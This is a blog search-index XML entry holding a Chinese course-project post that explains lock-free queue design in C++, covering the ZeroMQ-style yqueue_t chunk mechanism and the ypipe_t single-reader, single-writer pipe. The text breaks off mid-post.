<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网络程序设计_课程项目</title>
    <link href="/2023/12/21/lock-free-queue/"/>
    <url>/2023/12/21/lock-free-queue/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97">为什么需要无锁队列？</a></li><li><a href="#%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8D%95%E8%AF%BB%E5%8D%95%E5%86%99">无锁队列的实现（单读单写）</a><ul><li><a href="#%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0">原子操作函数</a></li><li><a href="#yqueue_t%E7%9A%84chunk%E5%9D%97%E6%9C%BA%E5%88%B6">yqueue_t的chunk块机制</a><ul><li><a href="#chunk%E4%B8%80%E6%AC%A1%E5%88%86%E9%85%8D%E5%A4%9A%E4%B8%AA%E5%85%83%E7%B4%A0">chunk一次分配多个元素</a></li><li><a href="#chunk%E5%9D%97%E6%9C%BA%E5%88%B6-%E5%B1%80%E9%83%A8%E6%80%A7%E5%8E%9F%E7%90%86">chunk块机制 局部性原理</a></li></ul></li><li><a href="#yqueue_t%E6%88%90%E5%91%98%E5%92%8C%E6%8E%A5%E5%8F%A3%E4%BB%8B%E7%BB%8D">yqueue_t成员和接口介绍</a><ul><li><a href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0yqueue_t">构造函数yqueue_t</a></li><li><a href="#%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0yqueue_t">析构函数~yqueue_t</a></li><li><a href="#frontback%E5%87%BD%E6%95%B0">front、back函数</a></li><li><a href="#push%E5%87%BD%E6%95%B0">push函数</a></li><li><a href="#unpush%E5%87%BD%E6%95%B0">unpush函数</a></li><li><a href="#pop">pop</a></li></ul></li><li><a href="#ypipe">ypipe</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E5%86%99%E5%85%A5%E5%92%8C%E8%AF%BB%E5%8F%96">如何写入和读取</a></li><li><a href="#%E8%AF%BB">读</a></li><li><a href="#wrfc%E8%AF%A6%E8%A7%A3">w,r,f,c详解</a><ul><li><a href="#ypipe_t">ypipe_t</a></li><li><a href="#write">write</a></li><li><a href="#flush">flush</a></li><li><a href="#read">read</a></li><li><a href="#check_read">check_read</a></li></ul></li></ul></li></ul></li><li><a href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86%E5%8D%95%E8%AF%BB%E5%8D%95%E5%86%99">整体思路梳理（单读单写）</a></li><li><a href="#%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%AF%BB%E5%A4%9A%E5%86%99">无锁队列的实现（多读多写）</a><ul><li><a href="#arraylockfreequeue">ArrayLockFreeQueue</a></li><li><a href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D">函数介绍</a><ul><li><a href="#%E5%8F%96%E4%BD%99%E5%87%BD%E6%95%B0">取余函数</a></li><li><a href="#%E5%85%A5%E9%98%9F%E5%87%BD%E6%95%B0enqueue">入队函数enqueue</a></li><li><a href="#%E5%87%BA%E9%98%9F%E5%87%BD%E6%95%B0dequeue">出队函数dequeue</a></li><li><a href="#%E5%A4%9A%E8%AF%BB%E5%A4%9A%E5%86%99%E7%9A%84%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93">多读多写的机制总结</a></li></ul></li><li><a href="#yield%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7">yield的重要性</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93%E8%87%B4%E8%B0%A2">总结&amp;致谢</a></li></ul><h1 id="为什么需要无锁队列？"><a href="#为什么需要无锁队列？" class="headerlink" title="为什么需要无锁队列？"></a>为什么需要无锁队列？</h1><p>传统的高并发场景中，是使用阻塞机制来避免并发带来的各种问题。但是传统的阻塞机制有以下两个问题</p><ol><li>阻塞意味着线程要进行切换，而线程的切换会带来cache的失效。而cache作为存储体系中最重要的一环，频繁地失效肯定会带来极大的开销和性能损失</li><li>如果一个线程要处理的事情非常多，但是它却经常为了某个资源而被阻塞住，那肯定会降低系统的吞吐量，带来很高的延迟</li></ol><h1 id="无锁队列的实现（单读单写）"><a href="#无锁队列的实现（单读单写）" class="headerlink" title="无锁队列的实现（单读单写）"></a>无锁队列的实现（单读单写）</h1><h2 id="原子操作函数"><a href="#原子操作函数" class="headerlink" title="原子操作函数"></a>原子操作函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">atomic_ptr_t</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">set</span><span class="hljs-params">(T *ptr_)</span></span>; <span class="hljs-comment">//⾮原⼦操作</span><br>    <span class="hljs-function">T *<span class="hljs-title">xchg</span><span class="hljs-params">(T *val_)</span></span>; <span class="hljs-comment">//原⼦操作，设置⼀个新的值，然后返回旧的值</span><br>    <span class="hljs-function">T *<span class="hljs-title">cas</span><span class="hljs-params">(T *cmp_, T *val_)</span></span>;<span class="hljs-comment">//原⼦操作</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">volatile</span> T *ptr;<br>&#125;;<br></code></pre></td></tr></table></figure><ol><li><code>set</code>是直接设置ptr的值</li><li><code>xchg</code>是设置ptr的值为val，并返回ptr设置之前的值</li><li><code>cas</code>是先比较<ol><li>若ptr和cmp相同，则设置ptr为val并返回ptr设置之前的值</li><li>若ptr和cmp不同，不设置ptr，直接返回ptr的值</li></ol></li></ol><h2 id="yqueue-t的chunk块机制"><a href="#yqueue-t的chunk块机制" class="headerlink" title="yqueue_t的chunk块机制"></a>yqueue_t的chunk块机制</h2><h3 id="chunk一次分配多个元素"><a href="#chunk一次分配多个元素" class="headerlink" title="chunk一次分配多个元素"></a>chunk一次分配多个元素</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_t</span> &#123;<br>   T values[N];<br>   <span class="hljs-type">chunk_t</span> *prev;<br>   <span class="hljs-type">chunk_t</span> *next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>一个chunk包含N个元素，因此可以减少分配内存的次数</p><p>会有一个spare_chunk的结构将空闲的chunk保存起来，需要的时候就可以直接拿出来用。在一个chunk空闲时，也不会直接删除，而是放入spare_chunk中</p><h3 id="chunk块机制-局部性原理"><a href="#chunk块机制-局部性原理" class="headerlink" title="chunk块机制 局部性原理"></a>chunk块机制 局部性原理</h3><p>利用局部性原理，可以将刚刚空闲的chunk放到spare_chunk中先保存着。如果后面马上就用上了，那就可以节省很多时间，而如果没用上，至少也可以省去重新分配动态内存的时间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">atomic_ptr_t</span>&lt;<span class="hljs-type">chunk_t</span>&gt; spare_chunk;<br></code></pre></td></tr></table></figure><p>执行pop的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (++begin_pos == N) <span class="hljs-comment">// 删除满一个chunk才回收chunk</span><br>    &#123;<br>        <span class="hljs-comment">// 将空闲chunk的指针暂时保留下来</span><br>        <span class="hljs-type">chunk_t</span> *o = begin_chunk;<br>        <span class="hljs-comment">// 由于空闲chunk是边界，因此更新边界</span><br>        begin_chunk = begin_chunk-&gt;next;<br>        begin_chunk-&gt;prev = <span class="hljs-literal">NULL</span>;<br>        begin_pos = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 将空闲chunk和上一个空闲chunk交换一下，然后将上一个给free掉</span><br>        <span class="hljs-type">chunk_t</span> *cs = spare_chunk.<span class="hljs-built_in">xchg</span>(o);<br>        <span class="hljs-built_in">free</span>(cs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行push的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 首先取到最后一个chunk和chunk内部的pos</span><br>    back_chunk = end_chunk;<br>    back_pos = end_pos; <br>    <span class="hljs-comment">// 如果最后一个chunk还有空间，则不需要做其他的操作</span><br>    <span class="hljs-keyword">if</span> (++end_pos != N)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 如果最后一个chunk没有空间了，则需要扩容，首先考虑一下spare_chunk是否有空闲的</span><br>    <span class="hljs-type">chunk_t</span> *sc = spare_chunk.<span class="hljs-built_in">xchg</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 如果有空闲的chunk，直接建立双向连接即可</span><br>    <span class="hljs-keyword">if</span> (sc)<br>    &#123;<br>        end_chunk-&gt;next = sc;<br>        sc-&gt;prev = end_chunk;<br>    &#125;<br>    <span class="hljs-comment">// 如果没有空闲的，先分配，再建立连接关系</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        end_chunk-&gt;next = (<span class="hljs-type">chunk_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">chunk_t</span>)); <br>        <span class="hljs-built_in">alloc_assert</span>(end_chunk-&gt;next);<br>        end_chunk-&gt;next-&gt;prev = end_chunk;<br>    &#125;<br>    <span class="hljs-comment">// 最后修改end_chunk即可</span><br>    end_chunk = end_chunk-&gt;next;<br>    end_pos = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="yqueue-t成员和接口介绍"><a href="#yqueue-t成员和接口介绍" class="headerlink" title="yqueue_t成员和接口介绍"></a>yqueue_t成员和接口介绍</h2><p>可以将这个队列看成是一个双向链表，链表的每个节点都是一个chunk，包含了N个元素，其他的概念和普通的队列差不多。</p><p>三种chunk的区别</p><ol><li>begin_chunk指向队列头部，从这取出元素</li><li>back_chunk指向队列的最后一个元素所在的chunk，back_pos指向最后一个元素</li><li>end_chunk指向队列最后一个chunk</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> N&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">yqueue_t</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">yqueue_t</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-keyword">inline</span> ~<span class="hljs-built_in">yqueue_t</span>();<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">unpush</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    <span class="hljs-keyword">private</span>:</span><br><span class="hljs-function">        struct chunk_t &#123;</span><br>            T values[N];<br>            <span class="hljs-type">chunk_t</span> *prev;<br>            <span class="hljs-type">chunk_t</span> *next;<br>        &#125;;<br>        <span class="hljs-type">chunk_t</span> *begin_chunk;<br>        <span class="hljs-type">int</span> begin_pos;<br>        <span class="hljs-type">chunk_t</span> *back_chunk;<br>        <span class="hljs-type">int</span> back_pos;<br>        <span class="hljs-type">chunk_t</span> *end_chunk;<br>        <span class="hljs-type">int</span> end_pos;<br>        <span class="hljs-type">atomic_ptr_t</span>&lt;<span class="hljs-type">chunk_t</span>&gt; spare_chunk;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="构造函数yqueue-t"><a href="#构造函数yqueue-t" class="headerlink" title="构造函数yqueue_t"></a>构造函数yqueue_t</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">yqueue_t</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化begin_chunk</span><br>    begin_chunk = (<span class="hljs-type">chunk_t</span> *)        <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">chunk_t</span>));<br>    <span class="hljs-built_in">alloc_assert</span>(begin_chunk);<br>    begin_pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 由于没有元素，因此back_chunk暂时失效</span><br>    back_chunk = <span class="hljs-literal">NULL</span>;<br>    back_pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// end_chunk指向的是最后一个chunk，因此有效</span><br>    end_chunk = begin_chunk;<br>    end_pos = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="析构函数-yqueue-t"><a href="#析构函数-yqueue-t" class="headerlink" title="析构函数~yqueue_t"></a>析构函数~yqueue_t</h3><p>销毁所有chunk资源</p><p>先遍历访问所有chunk，然后再检查spare_chunk</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">inline</span> ~<span class="hljs-built_in">yqueue_t</span>() &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span> (begin_chunk == end_chunk) &#123;<br>            <span class="hljs-built_in">free</span>(begin_chunk);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-type">chunk_t</span> *o = begin_chunk;<br>        begin_chunk = begin_chunk-&gt;next;<br>        <span class="hljs-built_in">free</span>(o);<br>    &#125;<br><br>    <span class="hljs-type">chunk_t</span> *sc = spare_chunk.<span class="hljs-built_in">xchg</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">free</span>(sc);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="front、back函数"><a href="#front、back函数" class="headerlink" title="front、back函数"></a>front、back函数</h3><p>可以注意到，返回的都是引用，因此可以通过函数的返回值修改对应chunk的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> begin_chunk-&gt;values[begin_pos];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> back_chunk-&gt;values[back_pos];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="push函数"><a href="#push函数" class="headerlink" title="push函数"></a>push函数</h3><p>前面已经分析过</p><h3 id="unpush函数"><a href="#unpush函数" class="headerlink" title="unpush函数"></a>unpush函数</h3><p>用来回退push操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">unpush</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 首先处理back块</span><br>    <span class="hljs-comment">// 如果back块的pos是0，说明直接退到前一个去了，否则的话就简单减1就可以</span><br>     <span class="hljs-keyword">if</span> (back_pos)<br>         --back_pos;<br>     <span class="hljs-keyword">else</span> &#123;<br>         back_pos = N - <span class="hljs-number">1</span>;<br>         back_chunk = back_chunk-&gt;prev;<br>     &#125;<br>    <span class="hljs-comment">// 再处理end块</span><br>    <span class="hljs-comment">// end块的pos如果为0，说明再退一步最后一个块就直接要被丢掉了，否则的话也是简单减1</span><br>     <span class="hljs-keyword">if</span> (end_pos)<br>         --end_pos;<br>     <span class="hljs-keyword">else</span> &#123;<br>         end_pos = N - <span class="hljs-number">1</span>;<br>         end_chunk = end_chunk-&gt;prev;<br>         <span class="hljs-built_in">free</span>(end_chunk-&gt;next);<br>         end_chunk-&gt;next = <span class="hljs-literal">NULL</span>;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>pop操作如果发现一个chunk为空了，需要执行xchg函数来处理空闲块，而这个函数必须是线程安全的。因为生产者和消费者分别调用push和pop时都可能使用这个spare_chunk</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (++begin_pos == N)<br>    &#123;<br>        <span class="hljs-type">chunk_t</span> *o = begin_chunk;<br>        begin_chunk = begin_chunk-&gt;next;<br>        begin_chunk-&gt;prev = <span class="hljs-literal">NULL</span>;<br>        begin_pos = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">chunk_t</span> *cs = spare_chunk.<span class="hljs-built_in">xchg</span>(o);<br>        <span class="hljs-built_in">free</span>(cs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ypipe"><a href="#ypipe" class="headerlink" title="ypipe"></a>ypipe</h2><p>ypipe在yqueue的基础上进行封装，实现了一个可以单读单写的无锁队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> N&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ypipe_t</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">ypipe_t</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-keyword">inline</span> <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">ypipe_t</span>();<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp;value_, <span class="hljs-type">bool</span> incomplete_)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">unwrite</span><span class="hljs-params">(T *value_)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">check_read</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">read</span><span class="hljs-params">(T *value_)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">probe</span><span class="hljs-params">(<span class="hljs-type">bool</span> (*fn)(T &amp;))</span></span>;<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-type">yqueue_t</span>&lt;T, N&gt; queue;<br>    <span class="hljs-comment">// 指向第一个未刷新的元素</span><br>    T *w;<br>    <span class="hljs-comment">// 指向第一个等待读的元素</span><br>    T *r;<br>    <span class="hljs-comment">// 指向最后一个待刷新的元素</span><br>    T *f;<br>    <span class="hljs-comment">// 读写指针共享，指向每一轮刷新的起点</span><br>    <span class="hljs-type">atomic_ptr_t</span>&lt;T&gt; c;<br>    <span class="hljs-built_in">ypipe_t</span>(<span class="hljs-type">const</span> <span class="hljs-type">ypipe_t</span> &amp;);<br>    <span class="hljs-type">const</span> <span class="hljs-type">ypipe_t</span> &amp;<span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> <span class="hljs-type">ypipe_t</span> &amp;);<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="如何写入和读取"><a href="#如何写入和读取" class="headerlink" title="如何写入和读取"></a>如何写入和读取</h3><p>首先看write函数，这个函数只会将更新底层的queue_t，并且在这一轮写结束的时候，即incomplete为false时，才更新f为待刷新的最后一个元素</p><p>在这里也可以看到queue_t的使用方法，先设置值，再调用push或者pop函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp;value_, <span class="hljs-type">bool</span> incomplete_)</span> </span>&#123;<br>    queue.<span class="hljs-built_in">back</span>() = value_;<br>    queue.<span class="hljs-built_in">push</span>();<br><br>    <span class="hljs-comment">//  Move the &quot;flush up to here&quot; poiter.</span><br>    <span class="hljs-keyword">if</span> (!incomplete_) &#123;<br>        f = &amp;queue.<span class="hljs-built_in">back</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是flush函数，再完成一波写入后，手动调用flush函数</p><p>flush函数就是更新了w和c两个指针</p><ol><li>w指针代表着已经写到哪了</li><li>c指针在读写线程之间共享<ol><li>读线程通过c知道是否读完了</li><li>写线程通过读线程是否将c设置为null知道读线程是否在睡眠</li></ol></li></ol><p>如果读线程在睡眠，返回false，否则返回true</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 如果w和f相同，说明没有需要flush的东西</span><br>    <span class="hljs-keyword">if</span> (w == f) <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">if</span> (c.<span class="hljs-built_in">cas</span>(w, f) != w)<br>    &#123;<br>        c.<span class="hljs-built_in">set</span>(f);<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>先检查是否有数据可读，如果没有，直接返回false</p><p>如果有数据可读，读出，并返回true</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">read</span><span class="hljs-params">(T *value_)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">check_read</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    *value_ = queue.<span class="hljs-built_in">front</span>();<br>    queue.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体来说，check_read</p><ol><li>如果r指针存在且和queue的front不同，说明已经被预取了，直接返回true</li><li>如果待操作的c指针是queue的首元素，则直接返回false，代表没有预取元素</li><li>否则就说明可以读，返回true</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">check_read</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() != r &amp;&amp; r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    r = c.<span class="hljs-built_in">cas</span>(&amp;queue.<span class="hljs-built_in">front</span>(), <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() == r || !r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果读线程调用read返回了false，则读线程应该阻塞自己</p><figure class="highlight 